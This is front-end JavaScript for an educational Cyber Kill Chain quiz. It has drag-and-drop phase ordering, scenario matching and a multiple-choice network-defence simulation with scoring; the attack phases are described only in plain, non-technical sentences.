/* --- Challenge 1: Drag-to-reorder --- */
function initQuizOrder() {
  const zone = document.getElementById('orderZone');
  const shuffled = [...correctOrder].sort(() => Math.random() - 0.5);
  shuffled.forEach((name, i) => {
    const card = document.createElement('div');
    card.className = 'quiz-card';
    card.dataset.name = name;
    card.innerHTML = `<div class="quiz-card-handle"><span></span><span></span><span></span></div><div class="quiz-card-position">${i + 1}</div><div class="quiz-card-text">${name}</div>`;
    zone.appendChild(card);
  });
  enableDragAndDrop(zone, '.quiz-card');
}

function enableDragAndDrop(container, selector) {
  container.addEventListener('pointerdown', (e) => {
    const card = e.target.closest(selector);
    if (!card || card.classList.contains('correct') || card.classList.contains('incorrect')) return;
    e.preventDefault();

    const startRect = card.getBoundingClientRect();
    const offsetY = e.clientY - startRect.top;
    const offsetX = e.clientX - startRect.left;

    const placeholder = document.createElement('div');
    placeholder.className = 'quiz-card-placeholder';
    placeholder.style.height = startRect.height + 'px';
    card.parentNode.insertBefore(placeholder, card);

    card.classList.add('dragging');
    card.style.position = 'fixed';
    card.style.width = startRect.width + 'px';
    card.style.top = startRect.top + 'px';
    card.style.left = startRect.left + 'px';
    card.style.zIndex = '1000';
    card.style.transition = 'box-shadow 0.2s ease, transform 0.2s ease';
    card.style.transform = 'scale(1.04)';

    const onMove = (e2) => {
      e2.preventDefault();
      card.style.top = (e2.clientY - offsetY) + 'px';
      card.style.left = (e2.clientX - offsetX) + 'px';

      const siblings = [...container.querySelectorAll(selector + ':not(.dragging)')];
      let placed = false;
      for (const sib of siblings) {
        const r = sib.getBoundingClientRect();
        if (e2.clientY < r.top + r.height / 2) {
          if (sib !== placeholder.nextElementSibling) {
            container.insertBefore(placeholder, sib);
          }
          placed = true;
          break;
        }
      }
      if (!placed) {
        const lastSib = siblings[siblings.length - 1];
        if (lastSib && placeholder !== lastSib.nextElementSibling) {
          lastSib.after(placeholder);
        }
      }
    };

    const onUp = () => {
      document.removeEventListener('pointermove', onMove);
      document.removeEventListener('pointerup', onUp);

      const phRect = placeholder.getBoundingClientRect();
      card.style.transition = 'top 0.18s ease-out, left 0.18s ease-out, transform 0.18s ease-out, box-shadow 0.18s ease-out';
      card.style.top = phRect.top + 'px';
      card.style.left = phRect.left + 'px';
      card.style.transform = 'scale(1)';

      setTimeout(() => {
        card.style.position = '';
        card.style.width = '';
        card.style.top = '';
        card.style.left = '';
        card.style.zIndex = '';
        card.style.transition = '';
        card.style.transform = '';
        card.classList.remove('dragging');
        placeholder.replaceWith(card);
        updatePositions(container, selector);
      }, 180);
    };

    document.addEventListener('pointermove', onMove);
    document.addEventListener('pointerup', onUp);
  });
}

function updatePositions(container, selector) {
  container.querySelectorAll(selector).forEach((c, i) => {
    const p = c.querySelector('.quiz-card-position');
    if (p) p.textContent = i + 1;
  });
}

/* --- Challenge 2: Scenario matching --- */
const scenarios = [
  { text: 'Searched LinkedIn for employee emails and job titles', phase: 'Reconnaissance' },
  { text: 'Created a malicious document and emailed it to the target', phase: 'Arm & Deliver' },
  { text: 'User opened the document, triggering hidden code execution', phase: 'Exploitation' },
  { text: 'Backdoor installed and encrypted channel established to attacker', phase: 'Establish Control' },
  { text: 'Confidential data compressed and transferred to external server', phase: 'Exfiltration' },
];

function initQuizMatch() {
  const pool = document.getElementById('eventPool');
  const grid = document.getElementById('phaseTargets');
  [...scenarios].sort(() => Math.random() - 0.5).forEach((s, i) => {
    const el = document.createElement('div');
    el.className = 'quiz-event';
    el.setAttribute('draggable', 'true');
    el.dataset.phase = s.phase;
    el.dataset.id = 'event-' + i;
    el.textContent = s.text;
    pool.appendChild(el);
  });
  correctOrder.forEach((label) => {
    const t = document.createElement('div');
    t.className = 'quiz-phase-target';
    t.dataset.phase = label;
    t.innerHTML = `<div class="quiz-phase-target-label">${label}</div><div class="quiz-phase-target-content"></div>`;
    grid.appendChild(t);
  });
  initMatchDragDrop();
}

function initMatchDragDrop() {
  let dragged = null;
  document.addEventListener('dragstart', (e) => {
    if (!e.target.classList.contains('quiz-event')) return;
    dragged = e.target; e.target.classList.add('dragging');
    e.dataTransfer.effectAllowed = 'move';
    e.dataTransfer.setData('text/plain', e.target.dataset.id);
  });
  document.addEventListener('dragend', (e) => {
    if (!e.target.classList.contains('quiz-event')) return;
    e.target.classList.remove('dragging');
    document.querySelectorAll('.quiz-phase-target').forEach((t) => t.classList.remove('drag-over'));
    dragged = null;
  });
  document.querySelectorAll('.quiz-phase-target').forEach((target) => {
    target.addEventListener('dragover', (e) => { e.preventDefault(); target.classList.add('drag-over'); });
    target.addEventListener('dragleave', () => target.classList.remove('drag-over'));
    target.addEventListener('drop', (e) => {
      e.preventDefault(); target.classList.remove('drag-over');
      if (!dragged) return;
      const content = target.querySelector('.quiz-phase-target-content');
      const existing = content.querySelector('.quiz-event');
      if (existing) { existing.classList.remove('placed'); document.getElementById('eventPool').appendChild(existing); }
      dragged.classList.add('placed');
      dragged.classList.remove('dragging');
      content.appendChild(dragged);
    });
  });
  document.querySelectorAll('.quiz-phase-target-content').forEach((c) => {
    c.addEventListener('click', (e) => {
      const ev = e.target.closest('.quiz-event');
      if (ev) { ev.classList.remove('placed'); document.getElementById('eventPool').appendChild(ev); }
    });
  });
}


/* --- Challenge 3: Defend the Network (interactive simulation) --- */
let defendScore = 0;
let defendComplete = false;

const defenseRounds = [
  {
    phase: 'Reconnaissance',
    alert: 'An unknown entity is scanning your public infrastructure and scraping employee data from social media profiles.',
    options: [
      { text: 'Limit public exposure & deploy social engineering awareness training', correct: true },
      { text: 'Patch all known CVEs on internal application servers', correct: false },
      { text: 'Deploy DLP tools to monitor outbound data transfers', correct: false },
    ]
  },
  {
    phase: 'Arm & Deliver',
    alert: 'A wave of spoofed emails carrying suspicious attachments is flooding employee inboxes, disguised as urgent invoices from a trusted vendor.',
    options: [
      { text: 'Monitor internal network for unusual lateral movement', correct: false },
      { text: 'Deploy email gateway filtering & sandbox suspicious attachments', correct: true },
      { text: 'Rotate all employee account passwords immediately', correct: false },
    ]
  },
  {
    phase: 'Exploitation',
    alert: 'An employee opened a document that is exploiting an unpatched vulnerability to execute malicious code on their workstation.',
    options: [
      { text: 'Restrict employee LinkedIn profile visibility', correct: false },
      { text: 'Patch known vulnerabilities & enforce macro-disabled policies', correct: true },
      { text: 'Implement network segmentation between departments', correct: false },
    ]
  },
  {
    phase: 'Establish Control',
    alert: 'A compromised workstation is making regular encrypted connections to an unknown overseas IP every 30 seconds.',
    options: [
      { text: 'Isolate the endpoint & block C2 traffic at the firewall', correct: true },
      { text: 'Deploy email attachment sandboxing rules', correct: false },
      { text: 'Conduct a vulnerability scan on public-facing web apps', correct: false },
    ]
  },
  {
    phase: 'Exfiltration',
    alert: 'Anomalous data flows detected: 2.4 GB of compressed files being transferred to an external IP address during off-hours.',
    options: [
      { text: 'Enable multi-factor authentication across all accounts', correct: false },
      { text: 'Implement DLP monitoring & block unauthorized bulk transfers', correct: true },
      { text: 'Deploy an updated email security gateway', correct: false },
    ]
  },
];

function initQuizDefend() {
  document.getElementById('defendStartBtn').addEventListener('click', startDefendSimulation);
}

function startDefendSimulation() {
  const startBtn = document.getElementById('defendStartBtn');
  startBtn.style.display = 'none';

  const timeline = document.getElementById('defendTimeline');
  timeline.innerHTML = '<div class="defend-track-line"></div>';
  defenseRounds.forEach((round, i) => {
    const node = document.createElement('div');
    node.className = 'defend-node';
    node.dataset.index = i;
    node.innerHTML = `<span class="defend-node-num">${i + 1}</span><div class="defend-node-label">${round.phase}</div>`;
    timeline.appendChild(node);
  });

  defendScore = 0;
  defendComplete = false;
  playDefendRound(0);
}

function playDefendRound(index) {
  if (index >= defenseRounds.length) {
    showDefendResult();
    return;
  }

  const round = defenseRounds[index];
  const scenario = document.getElementById('defendScenario');
  const nodes = document.querySelectorAll('.defend-node');

  nodes.forEach((n, i) => {
    n.classList.remove('active');
    if (i === index) n.classList.add('active');
  });

  const shuffled = [...round.options].sort(() => Math.random() - 0.5);
  const letters = ['A', 'B', 'C'];

  scenario.innerHTML = `
    <div class="defend-alert">
      <div class="defend-alert-header">
        <span class="defend-alert-badge"><span class="defend-alert-dot"></span>INCOMING THREAT</span>
        <span class="defend-alert-phase">Phase ${index + 1}: ${round.phase}</span>
      </div>
      <p class="defend-alert-text">${round.alert}</p>
    </div>
    <div class="defend-prompt">Choose your defensive response:</div>
    <div class="defend-options">
      ${shuffled.map((opt, i) => `
        <button class="defend-option" data-correct="${opt.correct}">
          <span class="defend-option-marker">${letters[i]}</span>
          <span class="defend-option-text">${opt.text}</span>
        </button>
      `).join('')}
    </div>
  `;

  scenario.querySelectorAll('.defend-option').forEach(btn => {
    btn.addEventListener('click', () => handleDefendChoice(btn, index), { once: true });
  });
}

function handleDefendChoice(btn, index) {
  const isCorrect = btn.dataset.correct === 'true';
  const nodes = document.querySelectorAll('.defend-node');
  const scenario = document.getElementById('defendScenario');

  scenario.querySelectorAll('.defend-option').forEach(b => {
    b.classList.add('disabled');
    if (b.dataset.correct === 'true') b.classList.add('correct');
  });

  if (isCorrect) {
    btn.classList.add('correct');
    nodes[index].classList.remove('active');
    nodes[index].classList.add('defended');
    defendScore++;
  } else {
    btn.classList.add('incorrect');
    nodes[index].classList.remove('active');
    nodes[index].classList.add('breached');
  }

  setTimeout(() => playDefendRound(index + 1), 1200);
}

function showDefendResult() {
  const scenario = document.getElementById('defendScenario');
  defendComplete = true;

  let msg, emoji;
  if (defendScore === 5) { msg = 'Perfect defense! The attack was completely neutralized.'; emoji = '&#128737;'; }
  else if (defendScore >= 3) { msg = `You blocked ${defendScore} of 5 phases. The attacker still caused some damage.`; emoji = '&#9888;'; }
  else { msg = `Only ${defendScore} of 5 phases blocked. The attacker achieved their objective.`; emoji = '&#128680;'; }

  scenario.innerHTML = `
    <div class="defend-result-card">
      <div class="defend-result-emoji">${emoji}</div>
      <div class="defend-result-score">${defendScore}/5</div>
      <div class="defend-result-label">Phases Defended</div>
      <p class="defend-result-msg">${msg}</p>
    </div>
  `;
}


/* --- Quiz Submit & Grading --- */
function initQuizSubmit() {
  document.getElementById('quizSubmit').addEventListener('click', () => showResults(gradeQuiz()));
  document.getElementById('retryBtn').addEventListener('click', () => {
    document.getElementById('results').classList.add('hidden');
    document.getElementById('quiz').scrollIntoView({ behavior: 'smooth' });
    resetQuiz();
  });
}

function gradeQuiz() {
  let correct = 0;
  const total = correctOrder.length * 3; // 5 ordering + 5 matching + 5 defend = 15

  document.querySelectorAll('#orderZone .quiz-card').forEach((c, i) => {
    const ok = c.dataset.name === correctOrder[i];
    c.classList.remove('correct', 'incorrect');
    c.classList.add(ok ? 'correct' : 'incorrect');
    if (ok) correct++;
  });

  document.querySelectorAll('.quiz-phase-target').forEach((t) => {
    const ev = t.querySelector('.quiz-event');
    t.classList.remove('correct', 'incorrect');
    if (ev) {
      const ok = ev.dataset.phase === t.dataset.phase;
      ev.classList.remove('correct', 'incorrect');
      ev.classList.add(ok ? 'correct' : 'incorrect');
      t.classList.add(ok ? 'correct' : 'incorrect');
      if (ok) correct++;
    } else { t.classList.add('incorrect'); }
  });

  correct += defendScore;
  return Math.round((correct / total) * 100);
}

function showResults(score) {
  const section = document.getElementById('results');
  section.classList.remove('hidden');
  setTimeout(() => section.scrollIntoView({ behavior: 'smooth' }), 100);
  const ring = document.getElementById('resultRing');
  const circ = 2 * Math.PI * 54;
  setTimeout(() => { ring.style.strokeDashoffset = circ - (score / 100) * circ; }, 300);
  const el = document.getElementById('resultScore');
  let cur = 0;
  const step = Math.ceil(score / 40);
  const iv = setInterval(() => { cur = Math.min(cur + step, score); el.textContent = cur + '%'; if (cur >= score) clearInterval(iv); }, 30);
  const t = document.getElementById('resultTitle');
  const m = document.getElementById('resultMessage');
  if (score >= 90) { t.textContent = 'Outstanding!'; m.textContent = 'You clearly understand the Cyber Kill Chain. You\'d make a great security analyst.'; }
  else if (score >= 70) { t.textContent = 'Great Work!'; m.textContent = 'You\'ve grasped the key concepts. Review the phases you missed and try again.'; }
  else if (score >= 50) { t.textContent = 'Getting There'; m.textContent = 'You understand the basics but some phases tripped you up. Scroll back and try again.'; }
  else { t.textContent = 'Keep Learning'; m.textContent = 'Review the animated demonstrations above; each one shows a real attack technique for its phase.'; }
}

function resetQuiz() {
  document.querySelectorAll('.quiz-card').forEach((c) => c.classList.remove('correct', 'incorrect'));
  const zone = document.getElementById('orderZone');
  const cards = [...zone.querySelectorAll('.quiz-card')].sort(() => Math.random() - 0.5);
  cards.forEach((c) => zone.appendChild(c));
  updatePositions(zone, '.quiz-card');

  document.querySelectorAll('.quiz-phase-target-content .quiz-event').forEach((e) => {
    e.classList.remove('placed', 'correct', 'incorrect');
    document.getElementById('eventPool').appendChild(e);
  });
  document.querySelectorAll('.quiz-phase-target').forEach((t) => t.classList.remove('correct', 'incorrect'));

  defendScore = 0;
  defendComplete = false;
  document.getElementById('defendTimeline').innerHTML = '';
  document.getElementById('defendScenario').innerHTML = '<div class="defend-waiting">Click <strong>Start Simulation</strong> to begin</div>';
  document.getElementById('defendStartBtn').style.display = '';

  document.getElementById('resultRing').style.strokeDashoffset = 339.292;
}

/* --- CSS injection for pulse button animation --- */
const style = document.createElement('style');
style.textContent = '@keyframes pulse-btn { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08);box-shadow:0 0 12px rgba(255,184,77,0.4)} }';
document.head.appendChild(style);
